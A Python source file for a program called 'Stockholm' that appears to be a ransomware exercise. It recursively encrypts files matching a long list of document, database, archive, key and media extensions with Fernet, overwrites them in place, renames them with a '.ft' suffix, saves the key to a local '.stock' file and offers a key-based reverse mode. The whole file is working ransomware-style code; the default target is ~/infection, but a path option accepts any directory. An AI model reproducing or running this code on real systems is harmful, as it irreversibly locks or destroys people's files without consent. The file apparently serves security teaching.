import argparse
import os
import sys

import colorama
import cryptography.fernet


class StockholmError(Exception):
    pass


def print_error(message: str):
    print(f'{colorama.Fore.RED}Error: {message}{colorama.Style.RESET_ALL}')


def iter_files(infection_path: str, filter_files: tuple):
    if not os.access(infection_path, os.F_OK | os.R_OK) or not os.path.isdir(infection_path) \
            or os.path.islink(infection_path):
        print_error(f'Error: Path "{infection_path}" is not accessible')
        return
    for dir_path, folders, files in os.walk(infection_path):
        for file in files:
            file_path = os.path.join(dir_path, file)
            if os.access(file_path, os.R_OK | os.W_OK) and file_path.endswith(filter_files):
                yield os.path.join(dir_path, file)


class Stockholm:
    VERSION = '1.0'
    DEFAULT_PATH = os.path.expanduser('~/infection')
    KEY_FILENAME = '.stock'
    ENCRYPTED_EXT = '.ft'
    EXTENSIONS = (
        '.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.ARC', '.PAQ', '.accdb', '.aes', '.ai', '.asc', '.asf',
        '.asm', '.asp', '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2', '.c', '.cgm', '.class', '.cmd',
        '.cpp', '.crt', '.cs', '.csr', '.csv', '.db', '.dbf', '.dch', '.der', '.dif', '.dip', '.djvu', '.doc', '.docb',
        '.docm', '.docx', '.dot', '.dotm', '.dotx', '.dwg', '.edb', '.eml', '.fla', '.flv', '.frm', '.gif', '.gpg',
        '.gz', '.h', '.hwp', '.ibd', '.iso', '.jar', '.java', '.jpeg', '.jpg', '.js', '.jsp', '.key', '.lay', '.lay6',
        '.ldf', '.m3u', '.m4u', '.max', '.mdb', '.mdf', '.mid', '.mkv', '.mml', '.mov', '.mp3', '.mp4', '.mpeg', '.mpg',
        '.msg', '.myd', '.myi', '.nef', '.odb', '.odg', '.odp', '.ods', '.odt', '.onetoc2', '.ost', '.otg', '.otp',
        '.ots', '.ott', '.p12', '.pas', '.pdf', '.pem', '.pfx', '.php', '.pl', '.png', '.pot', '.potm', '.potx',
        '.ppam', '.pps', '.ppsm', '.ppsx', '.ppt', '.pptm', '.pptx', '.ps1', '.psd', '.pst', '.rar', '.raw', '.rb',
        '.rtf', '.sch', '.sh', '.sldm', '.sldx', '.slk', '.sln', '.snt', '.sql', '.sqlite3', '.sqlitedb', '.stc',
        '.std', '.sti', '.stw', '.suo', '.svg', '.swf', '.sxc', '.sxd', '.sxi', '.sxm', '.sxw', '.tar', '.tbk', '.tgz',
        '.tif', '.tiff', '.txt', '.uop', '.uot', '.vb', '.vbs', '.vcd', '.vdi', '.vmdk', '.vmx', '.vob', '.vsd',
        '.vsdx', '.wav', '.wb2', '.wk1', '.wks', '.wma', '.wmv', '.xlc', '.xlm', '.xls', '.xlsb', '.xlsm', '.xlsx',
        '.xlt', '.xltm', '.xltx', '.xlw', '.zip')

    def __init__(self, silent=False):
        self.source_path = self.DEFAULT_PATH
        self.silent = silent
        self.__fernet = None
        self.__key = None

    def encrypt(self, source_path=None) -> None:
        if source_path:
            self.source_path = os.path.abspath(os.path.expanduser(source_path))
        self.__create_fernet()
        self.__save_key()
        for filepath in iter_files(self.source_path, self.EXTENSIONS):
            self.__print(filepath)
            self.__encrypt_file(filepath)

    def decrypt(self, key: str, target_path=None) -> None:
        if target_path:
            target_path = os.path.abspath(os.path.expanduser(target_path))
            os.makedirs(target_path, exist_ok=True)
        self.__create_fernet(key)
        for filepath in iter_files(self.source_path, (self.ENCRYPTED_EXT,)):
            self.__print(filepath)
            try:
                self.__decrypt_file(filepath, target_path)
            except cryptography.fernet.InvalidToken:
                print_error('Invalid token')
                exit()
            except TypeError:
                print_error('Invalid type')
                exit()

    def print_version(self) -> None:
        print(f'stockholm version {self.VERSION}')

    def __print(self, filename: str) -> None:
        if not self.silent:
            print(f'> {os.path.split(filename)[1]}')

    def __create_fernet(self, key: str = None):
        if not key:
            key = cryptography.fernet.Fernet.generate_key()
        self.__key = key
        try:
            self.__fernet = cryptography.fernet.Fernet(key)
        except ValueError:
            print_error('Invalid URL-safe base64-encoded 32-byte key')
            exit()

    def __encrypt_file(self, filepath: str) -> None:
        with open(filepath, 'rb') as file:
            content = file.read()
            encrypted_content = self.__fernet.encrypt(content)
        with open(filepath, 'wb') as file:
            file.write(encrypted_content)
        new_filepath = filepath + self.ENCRYPTED_EXT
        os.rename(filepath, new_filepath)

    def __decrypt_file(self, filepath: str, target_path: str) -> None:
        with open(filepath, 'rb') as file:
            content = file.read()
            decrypted_content = self.__fernet.decrypt(content)
        with open(filepath, 'wb') as file:
            file.write(decrypted_content)
        if target_path:
            new_filepath = os.path.join(target_path, os.path.split(os.path.splitext(filepath)[0])[1])
        else:
            new_filepath = os.path.splitext(filepath)[0]
        os.rename(filepath, new_filepath)

    def __save_key(self):
        with open(self.KEY_FILENAME, 'wb') as key_file:
            key_file.write(self.__key)


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-v', '--version', action='store_true', help='show the version of the program')
    parser.add_argument('-r', '--reverse', help='reverse the infection followed by the encryption key')
    parser.add_argument('-s', '--silent', action='store_true', help='the program will not produce any output')
    parser.add_argument('-p', '--path', help='the path to the files to encrypt')
    parser.add_argument('-t', '--target', help='the path to store the decrypted files')
    return parser.parse_args()


if __name__ == '__main__':
    try:
        args = parse_args()
    except argparse.ArgumentError as ex:
        print_error(ex.message)
        sys.exit()
    stock = Stockholm(silent=args.silent)
    if args.version:
        stock.print_version()
    elif args.reverse:
        stock.decrypt(args.reverse, args.target)
    else:
        stock.encrypt(args.path)
